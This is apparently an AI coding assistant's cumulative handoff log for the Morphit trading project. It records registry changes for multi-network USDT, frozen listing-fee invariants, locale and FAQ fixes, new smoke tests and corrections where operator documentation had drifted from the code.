**i18n:**
- 28 keys × 10 locales = 280 native translations
- 3 FAQ entries (`what_is_usdt`, `why_usdt_warning`, `which_usdt_network`) wired into FAQ_KEYS + FAQ_RELATED + locales (q+a pairs)
- Allow-list extended for "Tether"/"Ethereum"/"Tron"/"Solana"/"BNB Smart Chain"/"USDT" proper-noun loanwords with reason codes

### 2 new sentinel smokes

- `usdt-trade-only-smoke` (11/11 green) — pins canonical + frontend registry invariants
- `usdt-network-picker-required-smoke` (9/9 green) — sentinel-greps /post + AddressShareModal + FundsSentModal for usdtNetwork-gated canSubmit
- Both registered in `scripts/run-smokes.sh`

### 5 new persona-walkthrough scenarios (P121-USDT-1..5)

### Docs shipped same turn (Memory #24 discipline)

- NEW `docs/adr/0023-usdt-multi-network.md` — full architectural ADR, all 9 design decisions
- `docs/ADDING-A-COIN.md` Category B example updated to match shipped reality
- `docs/OPERATIONS.md` new "Trade-only asset configuration" tail section
- `docs/RUN-A-MORPHIT-NODE.md` new "USDT and your operator stance" tail section
- `docs/PRE-LAUNCH-CHECKLIST.md` new [blocking] checklist item + schema v31→v32

### Marketing

- `MORPHIT-BRAG-LIST.md` 252 → 254 entries; footer count + date refreshed

### Verification

- **Triple-pulse `bash scripts/run-smokes.sh`: 2,405 scenarios green × 3, zero failures.**  Baseline 2,377 → 2,405 (+28).
- Locale parity 10/10 green at 2,478 keys × 10
- Translation-completeness: 0 unexpected byte-identical
- Fee-method-enum-frozen 7/7: USDT did NOT leak into fee_method enum (Memory #23 preserved)
- First-buy-waiver-payment-agnostic 6/6
- Web TS / svelte-check clean; indexer / relay / asset-registry TS clean

---

## Part 121 cp2 — what shipped previously

Ken asked whether the "one-time `npm install`" setup note I'd given verbally in cp1 was actually present in the operator/launch docs.  Grep confirmed it was — `RUN-A-MORPHIT-NODE.md` §736, `OPERATIONS.md` §7015-7038, `PRE-LAUNCH-CHECKLIST.md` §307-324 all carry the workspace-symlinks explanation with current numbers ("13 affected runners," "2,370+ scenarios").  Ken's correction was a process one: "please stop forgetting to update the .md files as we go along."

**Memory edit #24 committed 2026-05-13:** "Before EVERY tarball, grep operator/launch docs for setup/troubleshooting/operator implications of the turn's work; never assume coverage; if saying verbally 'one-time setup note' or 'environmental thing,' that's the SYMPTOM the doc update was missed — fix BEFORE tarball, not after Ken asks."

The self-audit triggered by that memory rule surfaced **one real gap that should have shipped in cp1**: ADR-0011 (the fee-model ADR) did not yet carry the Part 121 enum-freeze forward-note.

### cp2 changes

1. **`docs/RUN-A-MORPHIT-NODE.md` line 736** — extended `npm install` explanation: workspace symlinks, ERR_MODULE_NOT_FOUND symptom, framing as pure environment setup.

2. **`docs/OPERATIONS.md` §Tests + smoke** — appended a "Smoke-suite troubleshooting" block enumerating the 13 affected runners and the fix (`cd ~/morphit && npm install --no-audit --no-fund`), framed as pure environment setup not a code regression.

3. **`docs/PRE-LAUNCH-CHECKLIST.md` §C** — added a new `[blocking]` checkbox: "Run the static smoke suite and confirm it returns clean.  From the repo root: `bash scripts/run-smokes.sh`.  Expected output: `Total: 2370+ scenarios passed, 0 runners failed`."  Includes the ERR_MODULE_NOT_FOUND symptom + fix inline so an operator hitting it during pre-launch finds the answer without leaving the checklist.

4. **`apps/web/scripts/persona-walkthrough-smoke.ts`** — four new P121-DOC sentinel scenarios pinning the doc claims against future drift:
   - P121-DOC-1: RUN-A-NODE mentions workspace symlinks + ERR_MODULE_NOT_FOUND + @morphit/asset-registry
   - P121-DOC-2: OPERATIONS.md has the Smoke-suite troubleshooting block with the fix command
   - P121-DOC-3: PRE-LAUNCH-CHECKLIST §C has the smoke-suite verification step
   - **P121-DOC-4 (added in catch-up after memory #24):** ADR-0011 carries the Part 121 fee_method enum-freeze forward-note pointing at memory #23 and both sentinel-grep smokes.
   
   Header comment updated with the Part 121 additions block.

5. **`docs/adr/0011-dynamic-fee-model.md` (added in catch-up after memory #24)** — 2026-05-13 forward-note at the head of the ADR explaining that the `fee_method` field type union throughout this ADR is now a wire-format-frozen invariant per memory #23; points at the two sentinel-grep smokes that guard it (`fee-method-enum-frozen-smoke.ts`, `first-buy-waiver-payment-agnostic-smoke.ts`) and the user-facing rationale sections in FEES-AND-REWARDS §"What is FROZEN" and ADDING-A-COIN §"2026-05-13 architectural update."  Pattern lesson: when shipping a code-level invariant, the ADR that established the original wire format MUST gain a forward-note pointing at the freeze.  Self-audit triggered by memory #24 found this gap — exactly the failure mode #24 was committed to prevent.

Pattern lesson distilled: the cp1 `CHANGES-cp1.md` "Setup note for you (one-time)" was talking to Ken, but the operators who set up nodes will hit the same symptom and need to find the answer in the docs they're already reading — not in a tarball CHANGES file from a Part they weren't following.  Memory #14 says operator-facing claims belong in operator docs in the same work unit as the code.  cp2 closes that gap.

## Verification

- Triple-pulse `bash scripts/run-smokes.sh`: **2,374 scenarios green × 3, zero failures** (up from 2,370 in cp1; +4 P121-DOC scenarios).
- Persona-walkthrough-smoke: 37/37 (was 33/33).
- ADR-0011 line count grew from 1,561 → 1,582 (+21 forward-note lines).
- AUDIT-2026-05.md grew ~40 lines (Part 121 entry + cp1 catch-up section).
- REVISIT-LIST.md Part 121 maintained-line extended with the cp1 catch-up narrative.
- All other smokes unchanged.

## Combined cp1 + cp2 state

Everything from cp1 (asset-registry expansion, rename, two new sentinel smokes, locale shape, docs) PLUS three operator-doc edits + three smoke sentinels pinning them.



## Part 121 cp1 — what's shipped

Pretext: Ken's two forward-looking architecture questions after Part 120 closure — "Will it be easy to add new languages (7 more, total 17)?" + "Will it be easy to add more coins like USDT?" — plus the new architectural constraint that **listing fees can ONLY be paid in BLURT, XMR, or BTC** (memory edit #23).

### Investigation findings

- **Languages: already easy.**  `apps/web/src/lib/i18n/index.ts` carries `SUPPORTED_LOCALES` (10 today) AND `PLANNED_LOCALES` (the exact 7 Ken referenced: hi, ar, bn, pt, id, ja, vi).  Graduating is a one-line move + dropping a JSON.  No structural work needed.
- **Coins: mostly ready, three real gaps.**  Asset registries at both `packages/asset-registry/src/index.ts` and `apps/web/src/lib/assets/registry.ts` already had the right discriminators.  The indexer's `fee_method` enum is correctly hardcoded as wire-format-frozen `'blurt' | 'waived_first_buy' | 'btc' | 'xmr'`.  Three gaps closed:
  1. `apps/web/src/lib/explorer/urls.ts` hardcoded BTC/XMR branches → registry-driven dispatch
  2. No `network` sub-field for multi-network coins (USDT on ERC-20/TRC-20/SPL) → added
  3. No `privacyWarning` field for transparent/centrally-controllable assets → added

### Ken's design decisions (confirmed before code landed)

1. Multi-network coins: option B — single USDT entry with `supportedNetworks: ['erc20', 'trc20', 'sol']` and `defaultNetwork: null` to force explicit user choice every trade.
2. Privacy-warning chip: yes, added as `privacyWarningKey: string | null`.
3. First-buy waiver applies regardless of payment-method (waiver covers listing fee, not trade settlement).
4. Commit "listing fees BLURT/XMR/BTC only" rule to memory — done as memory edit #23.

### Code changes shipped this cp1

1. **`packages/asset-registry/src/index.ts`** — `AssetEntry` gains 3 new required fields: `supportedNetworks`, `defaultNetwork`, `privacyWarningKey`.  All 3 existing entries (XMR, BTC, BLURT) backfilled with `['mainnet']` / `'mainnet'` / `null`.

2. **`packages/asset-registry/scripts/asset-registry-smoke.ts`** — 5 new invariants including the hard rule `canPayListingFee: true → ticker ∈ {BLURT, BTC, XMR}` enforcing memory #23 at the registry level.

3. **`apps/web/src/lib/assets/registry.ts`** — frontend extension mirrors all 3 new fields.

4. **`apps/web/src/lib/chat/payload.ts`** — `PaymentMethod` type renamed to `ChatAssetTicker` with JSDoc explaining the lowercase-wire-format distinction.  Old name was misleading (sounded like fiat payment rail; was actually the asset/coin ticker for chat-side address-share payloads).

5. **6 importing files renamed** to match: `components/ChatMessage.svelte`, `components/AddressShareModal.svelte`, `components/FundsSentModal.svelte`, `trades/tradeStatusPure.ts`, `trades/tradeStatus.ts`, `trades/listenerDispatch.ts`.

6. **`apps/web/src/lib/explorer/urls.ts`** — refactored to registry-driven `EXPLORER_REGISTRY` map dispatch.  Adding a future trade-only asset's explorer link is now a single-entry addition, not a hardcoded branch.

7. **`apps/web/src/routes/post/+page.svelte`** — line 667 hardcoded triple-asset check replaced with `isAssetTicker(p.asset)` from the canonical registry; import added at line 53.

8. **NEW smoke `fee-method-enum-frozen-smoke.ts`** — 7 sentinel scenarios pinning the indexer's `fee_method` enum at the frozen 4-member set; checks against expansion tickers (usdt, ltc, doge, arrr, eth, sol, bch, xlm, dash).

9. **NEW smoke `first-buy-waiver-payment-agnostic-smoke.ts`** — 6 sentinel scenarios brace-balanced-extracting the waiver branch from `order.ts`, validating the gate checks (side, asset) and asserting the gate portion (pre-INSERT) does NOT reference `payment_methods` or any fiat payment rail.  **Bonus catch during development:** first draft flagged the INSERT statement's `payment_methods` column — false positive.  Refined to scope the check to the gate portion only.

10. **`scripts/run-smokes.sh`** — both new smokes registered.

11. **All 10 locale JSON files** — added `assets.privacy_warnings` object (empty for now; shape ready for when USDT lands).  Locale parity 10/10 green at 2,459 keys × 10.

### Doc changes

- **`docs/ADDING-A-COIN.md`** — appended Part 121 architectural section explaining Category A (full-citizen coin, requires deep operator trust) vs Category B (trade-only coin, common case for new additions), with worked USDT multi-network example.
- **`docs/FEES-AND-REWARDS.md`** — appended "What is FROZEN" section with the fee-surface invariant table and pointers to the two new sentinel-grep smokes.
- **`docs/AUDIT-2026-05.md`** — Part 121 entry appended.
- **`docs/REVISIT-LIST.md`** — Part 121 maintained-line added at top.

### Verification

- Triple-pulse `bash scripts/run-smokes.sh`: **2,370 scenarios green × 3, zero failures** (baseline grew 2,322 → 2,370 from +13 new smoke scenarios + ~35 new asset-registry invariants).
- Web TypeScript: 0 errors (`npx tsc --noEmit`).
- Web Svelte: 0 errors, 0 warnings (`npm run check`).
- Indexer TypeScript: 0 errors.
- Relay TypeScript: 0 errors.
- Asset-registry package TypeScript: 0 errors.
- Locale parity: 10/10 green, 2,459 keys × 10.

### Environmental note

Fresh clones with no `node_modules` see 13 smokes fail with `ERR_MODULE_NOT_FOUND` on `@morphit/asset-registry` imports.  This is NOT a code regression — it's that workspace symlinks under `node_modules/@morphit/asset-registry → packages/asset-registry` only exist after `npm install` at the workspace root.  Running `npm install --no-audit --no-fund` once fixes all 13 (verified in sandbox).  Tarball doesn't ship `node_modules` per project convention.

### What's deliberately NOT in this cp1

- **USDT itself is NOT added.**  The structural work shipped this cp1 alone with smoke coverage.  Adding USDT becomes a single-file follow-up (one entry in `packages/asset-registry/src/index.ts` + a logo SVG + translations of its specific privacy-warning text + frontend payment-method-registry plumbing for USDT-as-payment).
- **FAQ copy rewrites** (the many "BTC, XMR, or BLURT" mentions in `apps/web/src/lib/i18n/locales/en.json`).  Those rewrites happen the turn USDT actually lands, not in advance, so we don't accidentally promise something we haven't shipped.
- **Payment-method-registry expansion** for USDT-as-payment-rail — separate ADR-0021 follow-up if needed.



**Part 120 — what's done in checkpoint 11 (everything from cp10 plus):**

42. **FAQ orphan-entry fix.**  Caught a real production-bound bug: `apps/web/src/lib/utils/faqIndex.ts` `FAQ_KEYS` array had 102 entries, but `apps/web/src/lib/i18n/locales/en.json` had 104 entries — two orphans (`public_api`, `qr_login`) translated in all 10 locales but not rendering because `FAQ_KEYS` didn't list them.  Both are flagship-feature FAQs (public-API for aggregators/explorers/etc, QR-login via phone) that translators had localized but the surface didn't expose.  Added both keys to `FAQ_KEYS` (lines 127-128) and added `FAQ_RELATED` cross-nav entries: `public_api → ['run_your_own', 'how_to_run_node', 'rss_feeds', 'block_explorer']` and `qr_login → ['lost_keys', 'backup_practices', 'lock_vs_signout', 'how_morphit_protects_me']`.  FAQ now at 104 keys = 104 entries, zero orphans, zero missing.

43. **Brag-list stale-numbers sweep.**  Three counts had drifted:
    - Line 71: "1,960 self-checking smoke scenarios" → "2,320+" (actual smoke total via prior brag list claim 2,322; rounded down + plural for resilience to future drift).
    - Line 188: "21 ADRs" → "22 ADRs" (actual count of `docs/adr/*.md` is 22; added ADR-0022 to the examples list).
    - Line 189: "42 design and operations documents" → "46 design and operations documents" (actual count of `docs/*.md` is 46).
    - Verification footer: "2,322 self-checks across 107 runners" → "2,320+ self-checks across 100+ runners" (rounded down for the same drift-resilience reason).

44. **Brag-list §18 slim — items 203-272 → 203-252.**  Per the user's instruction "stick to the selling points, slim them WAY down, if some give away too much take them out completely."  Reduced 70 items averaging 200-800 words each to 50 items averaging 1-3 sentences each.  File size dropped 227 KB → 63 KB (72% reduction).  What was removed:
    - Internal Part numbers (`Part 119`, `Part 70`, etc.) — these are project-internal artifacts that mean nothing to a blog reader.
    - Memory-fact references (`Memory #11`, `Memory #14`) — internal disciplines.
    - Smoke-coverage counts and scenario numbers — attacker-relevant detail about what is and isn't tested.
    - Exact env-var names (`MORPHIT_RELAY_HIGHVALUE_SHORT_NAME_THRESHOLD`, etc.) — attacker-relevant defense-tuning knobs.
    - Exact defense-detector thresholds and parameter names — attacker recipe for evasion.
    - File-line citations (`apps/relay/src/...:line`) — attack surface mapping.
    - Internal lineage references (Findings F-7, H1, M1, B-2, So-3, D-11, etc.) — meaningless to outsiders.
    
    What was kept: the *selling point* of each entry, in voice a stranger would find compelling.  E.g. "Operator playbook for squatter defense — five attacker patterns to recognize, weekly periodic-audit procedure, active-attack incident response, and a 'diamond-hardened' preset" stayed; the exact env vars, the structured-log event names, and the §38.X subsection map all went.  Items that were ENTIRELY internal (e.g. detailed audit-of-an-audit narratives) were dropped; items that were both selling-point AND attack-surface-revealing were rewritten to keep just the selling point.
    
    Footer summary updated: "272 specific selling points" → "252 specific selling points"; intro updated: "200+ specific things" → "250+ specific things"; date updated to 2026-05-12.

45. **Fee-flow SVG regenerated — dark mode, Morphit brand colors, accurate fee splits.**  Old SVG: light-mode `#fafafa` background, amber/blue/purple palette, AND it stated "100% of fees" went to the operator-fees-recipient account which contradicts the actual code (per `apps/indexer/src/indexer/operatorEarnings.ts:154` and FEES-AND-REWARDS.md: BLURT-paid listing fees split 90/10 operator/treasury; BTC/XMR-paid listing fees go 100% to treasury).  New SVG at `apps/web/static/brand/morphit-fee-flow.svg`:
    - **Dark navy `#0B1220` background** (the morphit.io dark-mode surface from `tailwind.config.js`).
    - **Morphit emerald `#00DA69` for "Money in"** (welcome bonus, loyalty milestones, staking) — visually obvious which boxes represent money the user *receives*.
    - **Red `#DC2626` for "Money out"** (listing fee, cold-message, featured-slot) — visually obvious which represent money the user *pays*.
    - **Neutral `#8A96A8` for "Where fees land"** (operator + treasury) — middle column, money in transit.
    - **Soft purple `#A78BFA` for peer-to-peer** (the actual trade settlement that never touches Morphit) — preserved the original purple framing.
    - **Title bumped to 34pt + tagline + sub-tagline** for blog readability at full-page width.
    - **Accurate facts** verified against code: 60 BLURT base listing fee (≈ $0.12); 4th/5th/6th/7th+ Sybil tier multipliers labeled `1× · 2× · 4× · 8×`; 5 BLURT cold-message fee (≈ $0.01); 50 BLURT/hour featured slot, 6h minimum (= 300 BLURT floor); ~100 BLURT signup cost (paid by operator's relay via pre-minted ACTs, NOT by the user — explicitly framed as "operator's cost, not a fee"); 90% BLURT-listing-fee → operator's own account, 10% → @morphit-fees treasury; 100% BTC/XMR listing fees → treasury; 20 BLURT welcome bonus = 10 liquid + 10 BP; loyalty milestones 10/50/200/1000 BLURT-in-fees → 10/50/200/1000 BP (total 1,260 BP); ~7% APR staking from chain inflation.
    - **ELI5 voice** with proper grammar: "Buyer", "Seller", "First-time messager", "When paid in BLURT", "When paid in BTC or XMR", "Direct peer-to-peer settlement", "No escrow. No custody. No middleman.", "Morphit cannot see this."
    - **Rendered to PNG at 2400px wide** via `rsvg-convert` and placed at `/mnt/user-data/outputs/morphit-fee-flow.png` (487 KB) for the user's blog upload convenience.

Smokes green: persona-walkthrough 29/29, forgejo-not-gitea 3/3.

Total Part 120 fix-groups so far: **45 fix-groups across 41 docs/components** (29 doc fixes + 1 doc-deletion + 10 doc verified-clean + 1 FAQ wiring + 1 brag-list slim + 1 brag-list stale-numbers + 1 SVG regen + 1 historical-disclaimer cluster).

**Part 120 — what's done in checkpoint 12 (everything from cp11 plus the four closure pieces):**

46. **22 ADRs line-by-line audit.**  All ADRs in `docs/adr/` audited.  Three needed Part 120 forward-notes:
    - **ADR-0005** (Phase 3 subphase split) — added supplement to the existing 2026-05-07 forward-note explaining the "Go service" / "Go relay" / "Go indexer" framing in the original plan describes the pre-implementation design; the shipped reality is Node.js/TypeScript services with `tsx` as the runtime.  Rationale lives in ADR-0008's "Writing the indexer in Go instead of Node.js/TypeScript" section (no actively-maintained Go library for Blurt signature verification means we'd re-implement; `@beblurt/dblurt` gives us the full verify path in TS).  Preserved Go framing intact for historical accuracy.
    - **ADR-0008** (Phase 3b indexer architecture) — fixed inline drift at line 221: "Node 24 is fast enough" → "Node 22 is fast enough", matching the `package.json` `engines.node` declaration of `>=22.0.0` (lowered in Part 86's deps audit when CI was confirmed to run Node 22).
    - **ADR-0009** (Phase 3c order posting) — added Part 120 forward-note at the header explaining the "3 minutes" replace-window references throughout describe the originally-specified value; updated to 15 minutes in Part 70 per ADR-0001's 2026-05-07 Amendment.  Preserved the 3-minute references inline for historical accuracy; ADR-0001 is authoritative for the current window.
    
    Other ADRs verified self-maintaining or no drift to surface: ADR-0001 already has its 2026-05-07 Amendment for the 15-minute window; ADR-0010 correctly says use `create_claimed_account` not `account_create`; ADR-0011 maintains its own detailed Part-by-Part change log; ADR-0003 already corrected 8→10 languages; ADR-0007 cross-references ADR-0002 for the secp256k1 correction; ADR-0014 cleanly documents its supersession by ADR-0015 for the cipher/key-exchange component; ADR-0022 self-consistent.  No ADR-0016 cross-refs anywhere (that slot was the planned QR-pair ADR that landed as ADR-0022).

47. **AUDIT-2026-05.md Part 120 entry shipped.**  Appended a comprehensive Part 120 narrative covering: doc sweep summary (40 docs, 1 deleted, 29 fixed, 10 clean, 1 with own disclaimer); ADR sweep summary (3 with forward-notes, rest self-maintaining); top-5 consequential single-doc catches (BETA-INCIDENT-RUNBOOK port + env-var ghosts; ARCHITECTURE Go-vs-Node drift + fictional services; SECURITY §1a account-creation mechanism; PLAN.md drift forward-note; FAQ orphan-entry fix); brag list slim summary; FAQ orphan fix details; fee-flow SVG regeneration details; standing pattern lessons distilled this Part; verification status; full tarball trail.  AUDIT-2026-05.md grew from 16,704 lines to 16,795 (+91 lines).

48. **REVISIT-LIST.md Part 120 maintained-line added.**  New "Last maintained: 2026-05-12 (Part 120: ...)" entry at the top covering the full Part 120 scope.  Previous Part 119 + follow-up entry preserved as "Previous maintained:" per the standing convention so future sessions reading the doc see the lineage.

49. **Persona-walkthrough-smoke extended with 4 P120-FAQ scenarios.**  `apps/web/scripts/persona-walkthrough-smoke.ts` grew from 29 → 33 scenarios.  The new scenarios sentinel-pin the FAQ orphan catch:
    - **P120-FAQ-1:** `public_api` listed in `FAQ_KEYS` array in `apps/web/src/lib/utils/faqIndex.ts`
    - **P120-FAQ-2:** `qr_login` listed in `FAQ_KEYS` array
    - **P120-FAQ-3:** `public_api` FAQ entry present in `en.json`
    - **P120-FAQ-4:** `qr_login` FAQ entry present in `en.json`
    
    If a future refactor removes either key from `FAQ_KEYS`, OR if a translator deletes the locale entries without removing the keys, the smoke fails loudly in CI.  Smoke header comment updated with Part 120 additions block.  Triple-pulse result: 33 passed, 0 failed across all three pulses — fully stable.

**Total Part 120 fix-groups closed: 49 fix-groups across 47 docs/components.**

**Part 120 verification summary:**
- Persona-walkthrough-smoke: 33/33 green (was 29/29; +4 P120-FAQ scenarios)
- Forgejo-not-gitea smoke: 3/3 green
- FAQ parity: 104 keys = 104 entries, zero orphans, zero missing
- Brag list zero internal-detail leaks (grep verified)
- Fee-flow SVG well-formed and renders cleanly to PNG
- AUDIT-2026-05.md grew by 91 lines with the Part 120 entry
- REVISIT-LIST.md has Part 120 maintained-line at top

**Part 120 is CLOSED.**  Twelve incremental delta tarballs delivered (cp1 through cp11 full snapshots, cp12 first true delta).  Ready for next task.

**For the fresh session reading this:** every fix in this checkpoint is verifiable; smokes green; locale parity 2,458 × 10 unchanged; persona-walkthrough smoke 29/29 unchanged.

---

## Headline

**Three persona walk-throughs end-to-end + a follow-up
line-by-line audit of the four primary operator-facing docs
that caught twelve additional doc-vs-code drift bugs +
docs/API.md expansion + a sentinel-grep smoke that pins all
19 fixes against future regression.  Locale parity 2,458 ×
10.  Zero stale docs trailing live code.**

Ken's instructions across this Part:

1. **Initial:** walk Bob (existing Blurt user, multi-login
   soup-to-nuts), Sally (never owned crypto, full flow),
   and Sally-as-operator (sets up her own node from any
   .md she picks, every CLI/screen/button, launch through
   post-launch week one) end-to-end as three distinct
   personas; fix where necessary; finish `docs/API.md`.

2. **Follow-up:** "please read the operations md file and
   the RUN-A-MORPHIT-NODE.md file, every single line.  I
   think there might be some things in those files that
   is not perfectly accurate.  check over every cli
   command too, and even check the md syntax itself.
   oh yeah, check the prelaunch and week 1 files too
   please.  same scrutiny."

3. **Discretion call from Ken:** "numbers 1 and 2 might
   be a good idea.  use your discretion on those though,
   I don't want to break anything or drag this project
   out any longer."  I shipped the persona-walkthrough
   smoke (low-risk sentinel-grep, ~150 ms runtime,
   immediate value) and deferred B-3 chat encrypted-
   placeholder localization to Part 120 (architectural
   refactor, three-option fix plan filed in REVISIT §A).

Memory edit #22 (added this Part, 2026-05-11) formalizes
the three personas as STANDING discipline — every major
session runs them proactively, not only when Ken reminds.

### Fixes shipped this Part

**Bob walkthrough — 1 shipped, 1 deferred:**
- **B-2 SHIPPED** — `/backup-keys` paired-readonly
  explanation card with `web+morphit://backup-keys` phone
  deep-link.  4 locale keys × 10 = 40 new strings.
- **B-3 DEFERRED to Part 120** — paired Bob in
  `/chat/[peer]` sees hardcoded English `(encrypted)`
  for every past message.  Needs i18n threading into
  chatService.ts; three-option fix plan filed in
  REVISIT §A.
- **B-1 + B-4 through B-15 verified clean.**

**Sally (user) walkthrough — 2 shipped:**
- **S-11 SHIPPED** — `FundsSentModal.svelte` inline
  txid help line (Memory #21 teach-jargon-inline).
- **S-12 SHIPPED** — `Tooltip.svelte` default ariaLabel
  was hardcoded English `'More info'`; now reads
  `a11y.tooltip_more_info`; 3 hardcoded ariaLabel
  overrides on `/post` removed.
- **S-1 through S-10 verified clean.**

**Sally-operator walkthrough — 5 shipped:**
- **So-1 SHIPPED** — vps-bootstrap.sh callout in
  `RUN-A-MORPHIT-NODE.md` §5 + mirror in `OPERATIONS.md`
  preamble (Memory #14).
- **So-2 SHIPPED** — `apps/ops-cli/src/main.ts` JSDoc
  brought to parity with `printHelp()` (8 → 14 listed).
- **So-3 SHIPPED** — `/v1/health?verbose=1` env-opt-in
  callouts in OPERATIONS §0a, LAUNCH-DAY polling-loop,
  POST-LAUNCH-WEEK-ONE top of monitoring.
- **So-4 SHIPPED** — init.ts JSDoc step count 9 → ~17
  with disclaimer pointing at `steps.ts`.
- **So-6 SHIPPED** — RUN-A-MORPHIT-NODE.md §8 systemd
  drop-in callout (override `WorkingDirectory` + create
  `morphit-relay` system user) — this was the most
  consequential operator-facing fix in the Part.
- **So-5 acknowledged out-of-band** — Klingex URL
  verification is operator-action.

**Doc-vs-code drift catches (D-1 through D-15):**

| ID | What was wrong | What it's now |
|---|---|---|
| D-1 | `morphit ops` (with space) — 5 doc locations | `morphit-ops` |
| D-1 | `morphit ops mint-acts` non-existent subcommand | `apps/relay/scripts/mint-acts.ts` script path |
| D-2 | `MORPHIT_INDEXER_FEES_ACCOUNT` ghost env var | `MORPHIT_INDEXER_FEE_RECIPIENT` |
| D-3 | OPERATIONS §32 said Caddy was recommended | Reworded — nginx is recommended |
| D-4 | OPERATIONS.md TOC missing §0a + §41, 4 title mismatches | TOC byte-exact match section headers |
| D-5 | Monorepo install paths inconsistent in OPERATIONS.md | All 5 separate-dir refs → `/opt/morphit/apps/{relay,indexer}` |
| D-6 | PRE-LAUNCH wizard step count said 14 | ~17 with `steps.ts` disclaimer |
| D-7 | Fictitious `npm run start -- --dry-run` flag | `timeout 5 npm run start \|\| true` (exercises Zod) |
| D-8 | Stale schema v29 in PRE-LAUNCH | v31 (Part 113 added Signal C) |
| D-9 | Klingex URL `public-api.klingex.com/ticker/blurt` | `klingex.io/api/v1/ticker/BLURT_USDT` |
| D-10 | Fictitious backup cron `/opt/morphit-indexer/scripts/backup.sh` | systemd timer + `/usr/local/lib/morphit/morphit-backup.sh` |
| D-11 | 4 fictitious `/v1/health` diagnostics field paths | Real fields: `lag_blocks`, `diagnostics.operator_balances`, `/v1/release` for treasury, `status` |
| D-12 | RUN-A-NODE rejected PG 17 ("15.x or 16.x") | "15.x or higher" + PGDG-repo pointer |
| D-13 | Fictitious operator-register CLI invocation | `npx morphit-ops register` |
| D-14 | `/indexer/v1/health` (wrong nginx path) | `/api/indexer/v1/health` |
| D-15 | Health field `head_lag_blocks` | `lag_blocks` |

**docs/API.md expansion:**
- 6 missing public endpoints documented:
  `/v1/profiles/:account`, `/v1/profiles?accounts=`,
  `/v1/operators`, `/v1/instance/payment-methods`,
  `/v1/activity/volume`, `/v1/attestor-eligibility/:account`,
  `/v1/stranger-fee-quote`.
- New "Intentionally undocumented endpoints" section
  explains why 5 routes are deliberately omitted (need
  client-side crypto context to be useful).

**Persona-walkthrough smoke (path 2 from Ken's discretion
call):**
- `apps/web/scripts/persona-walkthrough-smoke.ts` — 29
  scenarios sentinel-pinning all 19 fixes.  Sentinel-grep
  pattern; ~150 ms runtime.
- Registered in `scripts/run-smokes.sh` after
  `sally-walkthrough-smoke`.
- **Caught one real residual on its first run** that I'd
  missed during the manual doc-audit sweep: a second
  `MORPHIT_INDEXER_FEES_ACCOUNT` occurrence in
  LAUNCH-DAY.md line 200 beyond the one fixed at line 64.
  Exactly the value the sentinel provides.

---

## Where things stand

### Numbers

| Metric | Part 118 | Part 119 final | Δ |
|---|---|---|---|
| Smoke scenarios | 2,322 | **2,351** | +29 (persona-walkthrough smoke) |
| Frontend tests | 591 | 591 | unchanged |
| Indexer tests default | 452 | 452 | unchanged |
| Indexer integration | 81 | 81 | unchanged |
| Relay tests | 244 | 244 | unchanged |
| TypeScript errors | 0 / 8 projects | 0 / 8 projects expected | additive only |
| svelte-check errors | 0 / 0 | 0 / 0 expected | additive only |
| Locale parity (keys × locales) | 2,452 × 10 | **2,458 × 10** | +6 keys, +60 strings |
| Schema version | v31 | v31 | unchanged |
| Sandbox-runnable smokes | 29/32, 335 | **30/33, 364** | +1 runner / +29 scenarios |
| Brag list entries | 270 | **272** | +2 (#271 + #272) |
| Real fix count this Part | n/a | **19** | 7 persona + 12 doc-audit drift |

### Locale parity

Three new key groups added across all 10 locales (en, es,
fr, de, it, pl, ru, fa, zh-CN, zh-HK):

- `backup_keys.paired.{heading,body,deeplink_hint,deeplink_cta}` — B-2 (4 keys)
- `chat.funds_sent.txid_help` — S-11 (1 key)
- `a11y.tooltip_more_info` — S-12 (1 key)

All 6 keys × 10 locales = 60 translated strings, each
translated by hand in the target language.

### Triple-pulse stability

9/9 critical-path smokes pass × 3 pulses:
`i18n-locale-parity`, `i18n-key-coverage`,
`i18n-hardcoded-english`, `paired-readonly-affordance-surfaces`,
`price-model-picker-parity`, `sally-walkthrough`,
`forgejo-not-gitea`, `href-xss`,
**`persona-walkthrough`** (added this Part).

### Sandbox-runnable smokes

30/33 runners pass, 364 scenarios.  Same 3 smokes
require `node_modules` and fail in this sandbox
deterministically (same exclusion as Part 118 — not
regressions):

- `chain-op-verify-smoke`
- `desktop-pairing-crypto-smoke`
- `i18n-formatters-smoke`

These pass in CI where `npm ci` ran.

### Files modified

| Path | Change |
|------|--------|
| `apps/web/src/routes/backup-keys/+page.svelte` | B-2: paired-readonly explanation card + isPairedReadOnly import |
| `apps/web/src/lib/components/FundsSentModal.svelte` | S-11: txid help line under input |
| `apps/web/src/lib/components/Tooltip.svelte` | S-12: i18n-aware default ariaLabel |
| `apps/web/src/routes/post/+page.svelte` | S-12: removed 3 hardcoded ariaLabel props |
| `apps/web/src/lib/i18n/locales/{en,es,fr,de,it,pl,ru,fa,zh-CN,zh-HK}.json` | 60 new translated strings |
| `apps/web/scripts/persona-walkthrough-smoke.ts` | NEW: 29-scenario sentinel-grep smoke pinning all 19 fixes |
| `scripts/run-smokes.sh` | Registered persona-walkthrough-smoke after sally-walkthrough |
| `docs/RUN-A-MORPHIT-NODE.md` | So-1 (vps-bootstrap), So-6 (systemd drop-ins), D-1, D-10, D-11, D-12, D-13, D-14, D-15 |
| `docs/OPERATIONS.md` | So-1 mirror, So-3 verbose-health, D-1, D-2, D-3, D-4 (TOC), D-5 (paths), D-11 (health fields) |
| `docs/LAUNCH-DAY.md` | So-3, D-2, D-11 |
| `docs/POST-LAUNCH-WEEK-ONE.md` | So-3, D-6 (Klingex URL), D-7 (backup recipe), D-8 (health fields) |
| `docs/PRE-LAUNCH-CHECKLIST.md` | D-6 (step count), D-7 (--dry-run), D-8 (schema v31) |
| `apps/ops-cli/src/main.ts` | So-2: JSDoc 8 → 14 subcommands |
| `apps/ops-cli/src/commands/init.ts` | So-4: step count 9 → ~17 |
| `docs/API.md` | 6 new public endpoints + intentionally-undocumented section |
| `docs/AUDIT-2026-05.md` | Part 119 entry + follow-up extension COMPLETE |
| `docs/REVISIT-LIST.md` | Part 119 + follow-up maintained line; §A public-API CLOSED; new §A entry for B-3 |
| `MORPHIT-BRAG-LIST.md` | Entries #271 (persona walk-throughs) + #272 (doc audit); trailer 270 → 272 |
| `TARBALL.md` | This file |

### Files NOT modified

- `apps/web/src/lib/chat/chatService.ts` — B-3 deferred to focused Part 120 (architectural refactor)
